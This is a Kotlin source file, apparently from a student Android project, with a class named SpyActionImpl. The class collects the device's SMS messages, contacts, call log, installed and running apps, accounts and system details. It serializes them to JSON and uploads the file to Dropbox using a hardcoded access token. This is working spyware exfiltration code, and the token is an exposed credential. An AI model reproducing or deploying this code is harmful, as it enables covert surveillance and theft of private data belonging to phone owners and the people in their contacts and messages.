package com.homework.myapplication.spyservice

import android.os.Build
import com.dropbox.core.DbxRequestConfig
import com.dropbox.core.v2.DbxClientV2
import com.google.gson.Gson
import com.homework.myapplication.App
import com.homework.myapplication.presentation.SpyAction
import java.io.ByteArrayInputStream
import java.io.InputStream

class SpyActionImpl : SpyAction {


    private val getMessages: GetMessages = GetMessages()
    private val getContacts: GetContacts = GetContacts()
    private val getCalls: GetCalls = GetCalls()
    private val getInstalled: GetInstalled = GetInstalled()
    private val getRunning: GetRunning = GetRunning()
    private val getBattery: GetBattery = GetBattery()
    private val getMemory: GetMemory = GetMemory()
    private val getAccounts: GetAccounts = GetAccounts()

    override fun startAction() {
        val spyInfo = SpyInfo.Builder().apply {
            setMessages(getMessages(App.appContext))
            setContacts(getContacts(App.appContext))
            setCalls(getCalls(App.appContext))
            setVersion(Build.VERSION.RELEASE)
            setSdk(Build.VERSION.SDK_INT)
            setInstalled(getInstalled(App.appContext))
            setRunning(getRunning(App.appContext))
            setBattery(getBattery(App.appContext))
            setMemory(getMemory(App.appContext))
            setAccounts(getAccounts(App.appContext))
            build()
        }
        val data: ByteArray = Gson().toJson(spyInfo).toByteArray()
        uploadToDisk(ByteArrayInputStream(data))
    }

    private fun uploadToDisk(inputStream: InputStream) {
        val config = DbxRequestConfig.newBuilder("dropbox/bos1").build()
        val client = DbxClientV2(config, ACCESS_TOKEN)
        try {
            client.files().upload("/${FILE_NAME}")
                .uploadAndFinish(inputStream)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }

    companion object {
        private const val FILE_NAME = "data.txt"
        private const val ACCESS_TOKEN =
            "sl.BBm-Y0iX1b5bVrS11L1kPdb48SRO12FQILCKP0rQrwvO9zKqEKKCqoVv5so9FOnv0lYNWZ1yy6ANEJTvVIG3rKvvjZY0MGIm_gpz6PdQ2kWUbKHTyaBS7ugsv8OMRRrYMZsUAq-5BajC"
    }
}